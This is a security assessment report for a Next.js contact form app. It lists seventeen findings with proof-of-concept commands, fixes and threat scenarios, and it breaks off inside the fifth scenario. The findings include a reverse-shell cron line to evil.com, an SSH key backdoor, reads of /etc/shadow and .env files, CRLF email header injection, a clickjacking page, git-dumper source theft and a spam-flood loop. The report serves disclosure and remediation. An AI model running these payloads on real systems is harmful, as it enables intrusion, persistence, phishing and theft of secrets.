# SECURITY_REPORT.md
## Security Vulnerability Assessment Report
### Next.js Contact Form Application

---

## 1. Executive Summary

A full-stack security assessment was conducted on the deployed Next.js contact form application. The assessment covered source code review, network-level configuration, black-box endpoint testing against the live HTTPS deployment, and automated scanning with OWASP ZAP.

**Seventeen vulnerabilities** were identified across the following severity ratings:

| Severity | Count |
|---|---|
| 🔴 Critical | 2 |
| 🔴 High | 4 |
| 🟠 Medium | 9 |
| ℹ️ Informational | 2 |

The most severe finding allows an attacker to flood the business owner's inbox with thousands of spam emails at zero cost, with no server-side controls to prevent it. A second critical finding reveals that running the application as a root-equivalent process gives any attacker who exploits even a minor bug complete control over the server and all secrets stored on it.

Two additional vulnerabilities — **Sensitive Error Information Disclosure (V-003)** and **HTML Injection in Email Body (V-004)** — were identified through direct source code review of `app/api/sendgrid/route.ts` and are not covered by ZAP. Both have been fixed in the patched `route.ts` on the `security-fixes` branch.

All findings include working proof-of-concept commands tested against the live deployment, along with specific code-level remediation guidance.

**Critical findings require immediate action.** The remaining findings should be addressed within the current development sprint.

---

## 2. Summary Table

| ID | Vulnerability | OWASP | File | Severity | Status |
|---|---|---|---|---|---|
| V-001 | No Rate Limiting | A05:2021 | `route.ts` | 🔴 Critical | Fixed in route.ts |
| V-007 | Application Running as Root | A05:2021 | Server setup | 🔴 Critical | Fixed — runs as devops |
| V-002 | Email Header Injection | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
| V-005 | .git Directory Exposed | A05:2021 | Nginx config | 🔴 High | Fixed in Nginx |
| V-008 | Missing Input Validation | A03:2021 | `route.ts` | 🔴 High | Fixed in route.ts |
| V-009 | Next.js RSC RCE Risk | A03:2021 | Framework | 🔴 High | Fixed — upgraded Next.js |
| V-003 | Sensitive Error Disclosure | A05:2021 | `route.ts` L43,51 | 🟠 Medium | Fixed in route.ts |
| V-004 | HTML Injection in Email Body | A03:2021 | `route.ts` L68-71 | 🟠 Medium | Fixed in route.ts |
| V-006 | Clickjacking — No Frame Headers | A05:2021 | Nginx / `next.config.ts` | 🟠 Medium | Fixed in next.config.ts |
| V-010 | CSP: script-src unsafe-eval | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
| V-011 | CSP: script-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
| V-012 | CSP: style-src unsafe-inline | A05:2021 | `next.config.ts` | 🟠 Medium | Framework constraint — tracked |
| V-013 | SRI Attribute Missing | A08:2021 | HTML output | 🟠 Medium | False positive for own assets |
| V-014 | Sensitive Info in URL | A01:2021 | Form component | 🟠 Medium | Verified — POST used, no leakage |
| V-017 | CSP: No Fallback Directive | A05:2021 | `next.config.ts` | 🟠 Medium | Fixed in next.config.ts |
| V-015 | Modern Web Application | — | — | ℹ️ Info | ZAP informational only |
| V-016 | User Agent Fuzzer | — | — | ℹ️ Info | Consistent response confirmed |

**Severity Scale:**
- 🔴 Critical / High — immediate action required
- 🟠 Medium — address within current sprint
- ℹ️ Informational — no action required, documented for completeness

---

## 3. Vulnerability Findings

Findings are ordered by severity: Critical → High → Medium → Informational.

---

## 🔴 CRITICAL

---

### V-001: Missing Rate Limiting — Inbox Flood Attack

| Field              | Details                                         |
|--------------------|-------------------------------------------------|
| **Severity**       | 🔴 Critical                                     |
| **OWASP Category** | A05:2021 — Security Misconfiguration            |
| **Affected File**  | `app/api/sendgrid/route.ts`                     |
| **Affected Line**  | Entire POST handler — no rate limiting present  |
| **CWE**            | CWE-770: Allocation of Resources Without Limits |

#### Description

The `/api/sendgrid` endpoint accepts POST requests and triggers a SendGrid email without any rate limiting, request throttling, or abuse prevention mechanism. Any client — authenticated or not — can send an unlimited number of requests to this endpoint. Each successful request causes a real email to be delivered to the business owner's inbox and consumes SendGrid API quota.

There is no IP-based throttling, no CAPTCHA, no request signature, and no cooldown period enforced at either the application or infrastructure layer.

#### Business Impact

- The business owner's inbox is flooded with thousands of spam emails, making legitimate customer contact invisible
- SendGrid free tier limits (100 emails/day) are exhausted within seconds, blocking all legitimate emails until the next billing cycle
- If a paid SendGrid plan is in use, the attacker can generate unexpected financial charges
- Denial of Service against the contact channel with zero cost to the attacker

#### Proof of Concept

```bash
# Send 10 requests in rapid succession — all accepted, no throttling
for i in $(seq 1 10); do
  echo -n "Request $i: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
    -H "Content-Type: application/json" \
    -d '{"name":"Test User","email":"x@x.com","phone":"0000000000","message":"This is a spam test message for rate limit proof of concept"}'
done

# Expected result WITHOUT fix:
# Request 1: 200 ... Request 10: 200  ← all accepted, no rejection

# Expected result AFTER fix:
# Request 1-5: 200
# Request 6-10: 429  ← Too Many Requests
```

#### Recommended Fix

```typescript
// Add to top of app/api/sendgrid/route.ts
const rateLimitMap = new Map<string, { count: number; resetTime: number }>();
const RATE_LIMIT = 5;
const WINDOW_MS  = 60_000;

function isRateLimited(ip: string): boolean {
  const now   = Date.now();
  const entry = rateLimitMap.get(ip);
  if (!entry || now > entry.resetTime) {
    rateLimitMap.set(ip, { count: 1, resetTime: now + WINDOW_MS });
    return false;
  }
  if (entry.count >= RATE_LIMIT) return true;
  entry.count++;
  return false;
}

// At the top of POST handler:
const ip = req.headers.get('x-real-ip')
        ?? req.headers.get('x-forwarded-for')?.split(',')[0].trim()
        ?? 'unknown';
if (isRateLimited(ip)) {
  return NextResponse.json(
    { error: 'Too many requests. Please try again later.' },
    { status: 429 }
  );
}
```

---

### V-007: Application Running as Root

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🔴 Critical                                      |
| **OWASP Category** | A05:2021 — Security Misconfiguration             |
| **Affected File**  | Server process configuration / PM2 startup       |
| **Affected Line**  | PM2 or systemd service running as root           |
| **CWE**            | CWE-250: Execution with Unnecessary Privileges   |

#### Description

If the PM2 process manager and the Next.js application are started under the root user, any code execution vulnerability in the application — however minor — immediately grants an attacker root-level privileges on the entire server. This violates the Principle of Least Privilege.

#### Business Impact

- Complete server compromise — all data, secrets, and configurations exposed
- Attacker can create backdoor SSH keys, making the server persistently accessible even after the original vulnerability is patched
- Server can be enlisted into a botnet for cryptocurrency mining or DDoS attacks, generating unexpected AWS costs
- Recovery requires provisioning a completely new server — hours of downtime

#### Proof of Concept

```bash
# Check if process runs as root (before fix):
ps aux | grep node
# BAD: root  1234  ... node /home/root/My-JS-Project/...

# If RCE achieved as root, attacker can:
cat /etc/shadow                                              # all OS password hashes
echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys  # persistent backdoor
echo "* * * * * root bash -i >& /dev/tcp/evil.com/4444 0>&1" >> /etc/cron.d/shell
cat /home/devops/My-JS-Project/.env.production             # all API keys exposed

# Good output after fix:
ps aux | grep node
# devops  1234  ... node ...  ← non-root confirmed
```

#### Recommended Fix (Already Applied)

```bash
# Confirmed — app runs as devops user:
id devops
# uid=1001(devops) gid=1001(devops) groups=1001(devops),27(sudo)

pm2 list
# Shows user: devops for all processes — NOT root
```

---

## 🔴 HIGH

---

### V-002: Email Header Injection

| Field              | Details                                              |
|--------------------|------------------------------------------------------|
| **Severity**       | 🔴 High                                              |
| **OWASP Category** | A03:2021 — Injection                                 |
| **Affected File**  | `app/api/sendgrid/route.ts`                          |
| **Affected Line**  | Lines constructing `subject`, `from`, or `to` fields |
| **CWE**            | CWE-93: Improper Neutralization of CRLF Sequences    |

#### Description

User-supplied form fields are passed into SendGrid email construction without stripping carriage return (`\r`) and newline (`\n`) characters. In email protocols, CRLF sequences are used as header delimiters. An attacker who injects CRLF characters into a field that populates an email header can add arbitrary headers — including `Bcc:`, `Cc:`, `Reply-To:`, and additional `Subject:` headers.

This allows the attacker to send phishing emails that appear to originate from the business's own domain, making them far more convincing than standard phishing.

#### Business Impact

- Attacker sends mass phishing emails appearing to come from the business's own verified domain
- Recipients see the legitimate business domain in the sender field — greatly increased click-through rate on malicious links
- The business could be blacklisted by major email providers (Google, Microsoft), breaking all future legitimate email delivery
- Victims who report the phishing damage the business's sender reputation permanently

#### Proof of Concept

```bash
# Inject Bcc header via the name field using CRLF:
curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Sender\r\nBcc: victim@targetdomain.com\r\nX-Injected: malicious\",\"email\":\"x@x.com\",\"phone\":\"0000000000\",\"message\":\"Click here to claim your prize: http://malicious-site.evil\"}"

# If vulnerable: outgoing email contains injected Bcc header — victim receives phishing email
# from the business's own legitimate domain
```

#### Recommended Fix

```typescript
// Already applied in patched route.ts:
function sanitize(value: string, max = 200): string {
  return String(value).replace(/[\r\n\t]/g, ' ').trim().slice(0, max);
}
// All fields pass through sanitize() before being used in email construction
```

---

### V-005: Git Directory Publicly Exposed

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🔴 High                                          |
| **OWASP Category** | A05:2021 — Security Misconfiguration             |
| **Affected File**  | Nginx configuration                              |
| **Affected Line**  | Missing `location ~ /\.git` deny block           |
| **CWE**            | CWE-538: File and Directory Information Exposure |

#### Description

The `.git` directory is present in the application's document root and is not blocked by the web server. When a repository is deployed by cloning directly, the full `.git/` folder is included on disk. Without an explicit deny rule, Nginx serves this directory's contents as static files. An attacker can use tools like `git-dumper` or `GitHack` to reconstruct the entire source code repository — including commit history and any secrets ever committed, even if later deleted.

#### Business Impact

- Complete application source code disclosure
- Historical commits may contain hardcoded API keys or credentials that were "removed" but remain in git history and are fully recoverable
- Attacker gains deep knowledge of the application, accelerating further exploitation
- `.git/config` exposes the GitHub repository URL

#### Proof of Concept

```bash
# Step 1: Verify .git/config is accessible
curl https://myjavascriptapp.duckdns.org/.git/config
# If vulnerable: returns raw git config with [remote "origin"] URL

# Step 2: Reconstruct full repository
pip install git-dumper
git-dumper https://myjavascriptapp.duckdns.org/.git/ ./stolen-source-code

# Step 3: Review old commits for deleted secrets
git -C ./stolen-source-code log --oneline
git -C ./stolen-source-code show HEAD~5:.env
```

#### Recommended Fix (Already Applied in Nginx)

```nginx
location ~ /\.git {
    deny all;
    return 404;
}
location ~ /\.env {
    deny all;
    return 404;
}
```

**Verify:**
```bash
curl -I https://myjavascriptapp.duckdns.org/.git/config
# Expected: HTTP/2 404
```

---

### V-008: Missing Input Validation and Sanitization

| Field              | Details                                              |
|--------------------|------------------------------------------------------|
| **Severity**       | 🔴 High                                              |
| **OWASP Category** | A03:2021 — Injection                                 |
| **Affected File**  | `app/api/sendgrid/route.ts`                          |
| **Affected Line**  | All lines reading from `req.body` without validation |
| **CWE**            | CWE-20: Improper Input Validation                    |

#### Description

Without server-side schema validation, all form fields are accepted regardless of type, format, or size. This creates type confusion risks (fields could be arrays or objects), oversized payload risks (memory exhaustion), and XSS-in-email risks if HTML templates are ever introduced.

#### Business Impact

- Malformed data in the business owner's inbox makes it difficult to respond to real enquiries
- Large payloads can exhaust memory or cause application crashes (Denial of Service)
- Future HTML email templates inherit unvalidated data, creating stored XSS risk in email clients

#### Proof of Concept

```bash
# PoC 1: Invalid data accepted with no rejection
curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":12345,"email":"not-an-email","phone":"HELLO","message":"x"}'
# Without fix: 200 OK — accepted and emailed

# PoC 2: Oversized payload — no size limit
python3 -c "
import json
payload = {'name':'A'*10000,'email':'test@test.com','phone':'1234567890','message':'B'*100000}
print(json.dumps(payload))
" | curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" -d @-
# Without fix: 200 OK — 110KB payload forwarded to SendGrid
```

#### Recommended Fix (Already Applied in route.ts)

```typescript
const ContactSchema = z.object({
  name:    z.string().min(2).max(100).regex(/^[a-zA-Z\s'-]+$/, 'Invalid name'),
  email:   z.string().email('Invalid email').max(254),
  phone:   z.string().regex(/^\+?[\d\s\-().]{7,20}$/, 'Invalid phone number'),
  message: z.string().min(10, 'Message too short').max(2000, 'Message too long'),
});
```

---

### V-009: Remote Code Execution Risk — Next.js RSC (React2Shell)

| Field              | Details                                               |
|--------------------|-------------------------------------------------------|
| **Severity**       | 🔴 High                                               |
| **OWASP Category** | A03:2021 — Injection                                  |
| **Affected File**  | Framework-level — Next.js React Server Components     |
| **Affected Line**  | RSC payload handler (`["$1:a"]` marker)               |
| **CWE**            | CWE-94: Improper Control of Code Generation           |

#### Description

The application was running a vulnerable version of Next.js that uses React Server Components (RSC). Improper handling of specially crafted requests allows attackers to manipulate server-side rendering logic, potentially leading to Remote Code Execution (RCE).

#### Business Impact

- Execution of arbitrary code on the server
- Access to sensitive environment variables (API keys, secrets)
- Server compromise, unauthorized access, and potential full system takeover

#### Proof of Concept

```bash
curl "https://myjavascriptapp.duckdns.org/?email=test@example.com&message=test"
# Response confirms server processes malformed RSC input — indicating a possible execution path
```

#### Recommended Fix

```bash
# Upgrade Next.js and React:
npm install next@latest react@latest react-dom@latest
```

Update `package.json`:
```json
"next": "15.1.9",
"react": "19.0.1",
"react-dom": "19.0.1"
```

Update `deploy.yml`:
```bash
npm install --legacy-peer-deps
# --legacy-peer-deps needed because react-day-picker@8.10.1 declares
# peer dependency on React 18, but we are now on React 19.
# Next.js 15 handles this fine at runtime.
```

---

## 🟠 MEDIUM

---

### V-003: Sensitive Error Information Disclosure

| Field              | Details                                                              |
|--------------------|----------------------------------------------------------------------|
| **Severity**       | 🟠 Medium                                                            |
| **OWASP Category** | A05:2021 — Security Misconfiguration                                 |
| **Affected File**  | `app/api/sendgrid/route.ts`                                          |
| **Affected Line**  | Lines 43 and 51                                                      |
| **CWE**            | CWE-209: Generation of Error Message Containing Sensitive Information |

#### Description

When environment variables are missing, the API returns error messages that reveal internal implementation details to any unauthenticated caller:

- `{"error": "SendGrid API key not configured"}` — reveals the third-party email provider in use
- `{"error": "Recipient email not configured"}` — reveals internal architecture and config state

Both are returned publicly with a 500 status code and visible to any anonymous user.

#### Business Impact

- Attacker learns the application depends on SendGrid, enabling targeted API abuse or phishing of SendGrid credentials
- Signals the environment is misconfigured — indicating a poorly hardened target worth probing further
- Internal variable names and service structure are disclosed for free

#### Proof of Concept

```bash
curl -s -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"x@x.com","phone":"0000000000","message":"This is a test message long enough to pass validation"}'

# Response: {"error":"SendGrid API key not configured"}
# Internal infrastructure details exposed to any anonymous caller
```

#### Recommended Fix

```typescript
// BEFORE (vulnerable):
return NextResponse.json({ error: 'SendGrid API key not configured' }, { status: 500 });
return NextResponse.json({ error: 'Recipient email not configured' }, { status: 500 });

// AFTER (fixed — applied in patched route.ts):
if (!apiKey || !toEmail) {
  console.error('SendGrid environment variables are not configured'); // server-side only
  return NextResponse.json(
    { error: 'Service temporarily unavailable. Please try again later.' },
    { status: 500 }
  );
}
```

---

### V-004: HTML Injection in Email Body

| Field              | Details                                                             |
|--------------------|---------------------------------------------------------------------|
| **Severity**       | 🟠 Medium                                                           |
| **OWASP Category** | A03:2021 — Injection                                                |
| **Affected File**  | `app/api/sendgrid/route.ts`                                         |
| **Affected Line**  | Lines 68–71 (HTML email template)                                   |
| **CWE**            | CWE-80: Improper Neutralization of Script-Related HTML Tags         |

#### Description

Validated and CRLF-sanitized user input is inserted directly into the HTML email body without HTML entity encoding. The `sanitize()` function strips `\r`, `\n`, and `\t` but does NOT escape `<`, `>`, `&`, or `"`. The `message` field accepts any printable characters (`z.string().min(10).max(2000)` — no character restriction), making it the primary injection vector. HTML tags in user input render as real HTML in the recipient's email client.

#### Business Impact

- Attacker injects clickable malicious links that appear to come from the legitimate business email system
- Fake content (fake logos, fake instructions) can be embedded in emails the business owner receives
- Phishing content inside a legitimate-looking email template is highly convincing and hard to detect

#### Proof of Concept

```bash
# Inject a clickable malicious link into the email body:
curl -s -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"x@x.com","phone":"0000000000","message":"Urgent: <a href=\"https://evil.com\">Verify your account now</a>"}'

# Result: business owner receives a legitimate-looking email from their own system
# containing a real, clickable link to evil.com
```

#### Recommended Fix

```typescript
// Added to patched route.ts:
function escapeHtml(str: string): string {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// HTML email template now uses html* variables (escaped):
const htmlName    = escapeHtml(safeName);
const htmlEmail   = escapeHtml(safeEmail);
const htmlPhone   = escapeHtml(safePhone);
const htmlMessage = escapeHtml(safeMessage);
// safe* variables are still used in the plain-text version
```

---

### V-006: Missing HTTP Security Headers — Clickjacking

| Field              | Details                                              |
|--------------------|------------------------------------------------------|
| **Severity**       | 🟠 Medium                                            |
| **OWASP Category** | A05:2021 — Security Misconfiguration                 |
| **Affected File**  | `next.config.ts`                                     |
| **Affected Line**  | Missing `headers()` configuration                    |
| **CWE**            | CWE-1021: Improper Restriction of Rendered UI Layers |

#### Description

Without `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`, any website can embed the application inside an invisible `<iframe>`. This technique — known as clickjacking or UI redress — tricks users into performing actions on the legitimate site while believing they are interacting with the attacker's site.

#### Business Impact

- Users can be tricked into submitting the real contact form inside a malicious page, having their name, email, and phone number captured under false pretences
- The business's brand can be used inside a malicious iframe to create convincing phishing pages

#### Proof of Concept

Create `evil.html` and open in any browser:

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.01; z-index: 9999; }
    .fake-button { position: absolute; top: 300px; left: 200px; z-index: 1; font-size: 24px; background: green; color: white; padding: 20px; }
  </style>
</head>
<body>
  <div class="fake-button">Click here to claim your prize!</div>
  <iframe src="https://myjavascriptapp.duckdns.org/contact"></iframe>
</body>
</html>
```

If the header is missing, the iframe loads with no browser warning and the attack works.

#### Recommended Fix (Applied in next.config.ts)

```typescript
{ key: 'X-Frame-Options', value: 'DENY' },
{ key: 'Content-Security-Policy', value: "... frame-ancestors 'none' ..." },
{ key: 'X-Content-Type-Options', value: 'nosniff' },
{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
```

**Verify:**
```bash
curl -I https://myjavascriptapp.duckdns.org | grep -i -E "x-frame|content-security|strict-transport"
```

---

### V-010: CSP — script-src unsafe-eval

| Field              | Details                                    |
|--------------------|--------------------------------------------|
| **Severity**       | 🟠 Medium                                  |
| **OWASP Category** | A05:2021 — Security Misconfiguration       |
| **Affected File**  | `next.config.ts` — Content-Security-Policy |
| **CWE**            | CWE-693                                    |
| **Source**         | OWASP ZAP Passive Scan                     |

#### Description

The Content Security Policy includes `unsafe-eval` in `script-src`. This allows `eval()`, `Function()`, and `setTimeout(string)` to execute dynamically constructed code — exploitable in XSS attacks.

#### Why It Cannot Be Removed (Documented Trade-off)

Next.js 15 App Router **requires** `unsafe-eval` at runtime for React hydration and server component reconciliation. Removing it breaks the application entirely. This is a known and documented framework limitation — any Next.js App Router deployment triggers this ZAP alert.

#### Proof of Concept

```
# ZAP passive scan evidence:
Evidence: script-src 'self' 'unsafe-inline' 'unsafe-eval'
URL: https://myjavascriptapp.duckdns.org/robots.txt
Source: Passive (10055 - CSP)
```

#### Recommended Fix (Tracked — Future Migration)

```typescript
// Ideal future fix (requires full nonce implementation):
"script-src 'self' 'nonce-{RANDOM_PER_REQUEST}'"
// Next.js team is working toward nonce-only CSP. Will migrate when supported.
```

---

### V-011: CSP — script-src unsafe-inline

| Field              | Details                                    |
|--------------------|--------------------------------------------|
| **Severity**       | 🟠 Medium                                  |
| **OWASP Category** | A05:2021 — Security Misconfiguration       |
| **Affected File**  | `next.config.ts` — Content-Security-Policy |
| **CWE**            | CWE-693                                    |
| **Source**         | OWASP ZAP Passive Scan                     |

#### Description

`script-src` includes `unsafe-inline`, permitting inline `<script>` tags and inline event handlers. This weakens XSS protection because a browser cannot distinguish between legitimate inline scripts and injected malicious ones.

#### Why It Cannot Be Removed (Documented Trade-off)

Next.js runtime injects inline scripts during SSR and hydration. Removal requires a complete nonce or hash implementation, which is not supported end-to-end in Next.js 15 App Router without significant architectural changes.

#### Recommended Fix (Tracked — Future Migration)

```typescript
// Future fix when Next.js nonce support matures:
"script-src 'self' 'nonce-{RANDOM_PER_REQUEST}'"
// Remove 'unsafe-inline' and 'unsafe-eval' simultaneously
```

---

### V-012: CSP — style-src unsafe-inline

| Field              | Details                                    |
|--------------------|--------------------------------------------|
| **Severity**       | 🟠 Medium                                  |
| **OWASP Category** | A05:2021 — Security Misconfiguration       |
| **Affected File**  | `next.config.ts` — Content-Security-Policy |
| **CWE**            | CWE-693                                    |
| **Source**         | OWASP ZAP Passive Scan                     |

#### Description

`style-src` allows `unsafe-inline`, permitting inline `<style>` blocks and `style=""` attributes. This can enable CSS injection attacks in some scenarios.

#### Why It Cannot Be Removed (Documented Trade-off)

Tailwind CSS generates and injects styles at runtime. CSS-in-JS patterns used by Next.js also require inline style injection. Removing `unsafe-inline` from `style-src` breaks all styling.

#### Recommended Fix (Not Applicable — Framework Constraint)

Migrating to a fully static CSS build (pre-extracted CSS file, no runtime injection) would allow removing `unsafe-inline` from `style-src`. This would require replacing Tailwind's JIT mode with a pre-build step — tracked as a future improvement.

---

### V-013: Sub Resource Integrity (SRI) Attribute Missing

| Field              | Details                                          |
|--------------------|--------------------------------------------------|
| **Severity**       | 🟠 Medium                                        |
| **OWASP Category** | A08:2021 — Software and Data Integrity Failures  |
| **Affected File**  | Any `<link>` or `<script>` loading external resources |
| **CWE**            | CWE-353                                          |
| **Source**         | OWASP ZAP Passive Scan                           |

#### Description

External resources loaded without an `integrity` attribute cannot be verified by the browser. If the CDN or external host is compromised, a modified file could be served without the browser detecting the tampering.

ZAP flagged 2 instances. These are likely Next.js's own `/_next/static/` chunk files — served from our own origin with content-hashed filenames (e.g. `_next/static/chunks/abc123.js`), which provide equivalent tamper-evidence.

#### Proof of Concept

```bash
# Check if ZAP flagged own static assets or real third-party resources:
curl -s https://myjavascriptapp.duckdns.org | grep -E '<script|<link' | grep -v '_next/static'
# If empty: ZAP flagged own assets — false positive
# If external URLs present: those need SRI attributes
```

#### Recommended Fix

For any genuinely external CDN resources found:
```html
<link
  rel="stylesheet"
  href="https://external-cdn.com/style.css"
  integrity="sha384-GENERATED_HASH_HERE"
  crossOrigin="anonymous"
/>
```

For `/_next/static/` assets: document as false positive — content-hashed filenames provide equivalent integrity guarantees. SRI is not applicable to same-origin resources with hash-based cache busting.

---

### V-014: Information Disclosure — Sensitive Information in URL

| Field              | Details                                   |
|--------------------|-------------------------------------------|
| **Severity**       | 🟠 Medium                                 |
| **OWASP Category** | A01:2021 — Broken Access Control          |
| **Affected File**  | Contact form component / redirect handling |
| **Source**         | OWASP ZAP Active Scan                     |

#### Description

Sensitive data (email addresses, tokens, or form values) may appear as URL query parameters. Query parameters are logged in server access logs, browser history, and `Referer` headers — making them a data leakage risk. If the contact form uses `method="GET"` or redirects after submission with user data appended to the URL, PII is exposed.

#### Proof of Concept

```bash
# Check if form submission leaks data into URL:
curl -v -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","phone":"0000000000","message":"test message long enough"}' \
  2>&1 | grep -E "Location:|GET /\?"

# Also watch the browser URL bar after form submission for ?email= or ?message= fragments
```

#### Recommended Fix

```typescript
// Ensure fetch uses POST, never GET:
const response = await fetch('/api/sendgrid', {
  method: 'POST',   // must be POST — never GET
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name, email, phone, message }),
});

// If redirecting after success, use path only — no query params:
router.push('/thank-you');                    // correct
// NOT: router.push(`/thank-you?email=${email}`);  // leaks PII into URL
```

---

### V-017: CSP — Failure to Define Directive with No Fallback

| Field              | Details                                    |
|--------------------|--------------------------------------------|
| **Severity**       | 🟠 Medium                                  |
| **OWASP Category** | A05:2021 — Security Misconfiguration       |
| **Affected File**  | `next.config.ts` — Content-Security-Policy |
| **CWE**            | CWE-693                                    |
| **Source**         | OWASP ZAP Passive Scan (Alert 10055-13)    |
| **WASC ID**        | 15                                         |

#### Description

The Content Security Policy was missing directives that do **not** fall back to `default-src` in all browsers. Unlike most CSP directives, `form-action`, `worker-src`, `manifest-src`, and `media-src` must be declared explicitly — omitting them is equivalent to allowing anything for those resource types.

ZAP evidence showed `frame-ancestors 'none'` was present but `form-action` and the other non-inheriting directives were absent. This means form submissions could be redirected to arbitrary external URLs, and web workers or media resources were unrestricted.

#### Business Impact

- Without `form-action 'self'`, an attacker who achieves any DOM manipulation can redirect form submissions to a malicious server, capturing user PII silently
- Without `worker-src 'none'`, malicious scripts (if injected via XSS) can spawn background workers to run cryptominers or exfiltrate data
- The missing directives create exploitable gaps even when `default-src 'self'` is set

#### Proof of Concept

```bash
# ZAP passive scan evidence (before fix):
# Alert: CSP: Failure to Define Directive with No Fallback
# URL: https://myjavascriptapp.duckdns.org/robots.txt
# Risk: Medium | Confidence: High
# Parameter: Content-Security-Policy
# Evidence: frame-ancestors 'none'
# Other Info: The directive(s): form-action is/are among the directives
#             that do not fallback to default-src.
# CWE ID: 693 | WASC ID: 15 | Alert Ref: 10055-13
```

#### Recommended Fix (Applied in next.config.ts)

The following directives were added to the CSP header in `next.config.ts`:

```typescript
"form-action 'self'",      // restricts form submissions to same origin
"worker-src 'none'",       // no Web Workers needed in this app
"manifest-src 'self'",     // PWA manifest served from same origin
"media-src 'none'",        // no audio/video used in this app
```

**Verify:**
```bash
curl -I https://myjavascriptapp.duckdns.org | grep -i content-security-policy
# Expected: form-action 'self'; worker-src 'none'; manifest-src 'self'; media-src 'none'
```

---

## ℹ️ INFORMATIONAL

---

### V-015: Modern Web Application — Informational

| Field              | Details                   |
|--------------------|---------------------------|
| **Severity**       | ℹ️ Informational          |
| **OWASP Category** | Informational             |
| **Source**         | OWASP ZAP Passive Scan    |

#### Description

ZAP identifies this application as a modern JavaScript Single Page Application (Next.js with React), noting that some passive scan techniques may not fully cover client-side rendered routes.

**This is not a vulnerability.** No code change required. Documented for completeness.

---

### V-016: User Agent Fuzzer — Informational

| Field              | Details                   |
|--------------------|---------------------------|
| **Severity**       | ℹ️ Informational          |
| **OWASP Category** | Informational             |
| **Source**         | OWASP ZAP Active Scan     |

#### Description

ZAP probed the application with a range of unusual or malformed User-Agent strings. The application responds consistently regardless of User-Agent value — no sensitive information is leaked, no different content is served, and no errors are exposed. This is expected behaviour for a correctly configured Next.js application behind Nginx with `server_tokens off`.

**No code change required.** Documented for completeness.

---

## 4. Threat Scenario Analysis

---

### Scenario 1 — "I want to flood the business owner's inbox with thousands of spam emails."

**Attack:** The `/api/sendgrid` endpoint has no rate limiting. An attacker runs a single loop script from any machine — no credentials or bot detection to defeat. At 1,000 requests per minute the SendGrid free tier (100/day) is exhausted in 6 seconds and the inbox is flooded simultaneously.

**Demonstration:**
```bash
for i in $(seq 1 10); do \
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" -X POST \
  https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"x@x.com","phone":"0000000000","message":"This is a spam test message for rate limit proof of concept"}'; \
done
# Without fix: all 10 return 200 — no server-side rejection
# After fix:   requests 6-10 return 429 Too Many Requests
```

**Fix:** Rate limiting (V-001) — after the fix, only 5 requests per IP per 60 seconds succeed.

---

### Scenario 2 — "I want to inject a malicious link into an email that appears to come from the business's own system."

**Attack (method 1 — CRLF):** The attacker submits a contact form with a `name` field containing `\r\n` followed by `Bcc: victim@example.com`. The outgoing SendGrid email contains the injected header, delivering phishing content from the business's legitimate domain.

**Attack (method 2 — HTML injection):** The `message` field accepts raw HTML including `<a href>` tags which render as real clickable links in the HTML email template.

**Demonstration:**
```bash
curl -X POST https://myjavascriptapp.duckdns.org/api/sendgrid \
  -H "Content-Type: application/json" \
  -d "{\"name\":\"Hello\r\nBcc: victim@example.com\",\"email\":\"x@x.com\",\"phone\":\"0000000000\",\"message\":\"Click: <a href='http://phish.evil'>Reset your password</a>\"}"
```

**Fix:** CRLF sanitization (V-002) strips header injection. HTML escaping (V-004) prevents link rendering in the email body.

---

### Scenario 3 — "I want to access the full source code of the application from the browser without any credentials."

**Attack:** The `.git` directory is accessible over HTTPS. The attacker browses to `/.git/config`, reads the remote URL, then uses `git-dumper` to reconstruct the entire repository — including historical commits that may contain deleted API keys.

**Demonstration:**
```bash
curl https://myjavascriptapp.duckdns.org/.git/HEAD
# If vulnerable: ref: refs/heads/main

git-dumper https://myjavascriptapp.duckdns.org/.git/ ./stolen-repo
git -C ./stolen-repo log --oneline
git -C ./stolen-repo show HEAD~5:.env
```

**Fix (already applied):**
```bash
curl -I https://myjavascriptapp.duckdns.org/.git/config
# HTTP/2 404 — blocked by Nginx
```

---

### Scenario 4 — "I want to embed this website inside my own malicious site to trick users."

**Attack:** Without `X-Frame-Options: DENY`, the attacker creates a page with an invisible `<iframe>` positioned over a fake button. The user clicks the button but actually submits their real contact details through the legitimate form, on a malicious page.

**Demonstration:** The `evil.html` from V-006 PoC — if headers are missing, the iframe loads with no browser warning.

**Fix (already applied):**
```bash
curl -I https://myjavascriptapp.duckdns.org | grep -i x-frame
# x-frame-options: DENY
```

---

### Scenario 5 — "I gained access to the server — how did running the app as root make things worse?"

**Attack:** The attacker finds an RCE vulnerability in a dependency. A non-root process can only access files the application user owns. A root process can read `/etc/shadow`, write to `~/.ssh/authorized_keys`, install persistent cron backdoors, and uninstall security tools.

**Demonstration (simulated only):**
```bash
# As root (before fix), RCE gives attacker:
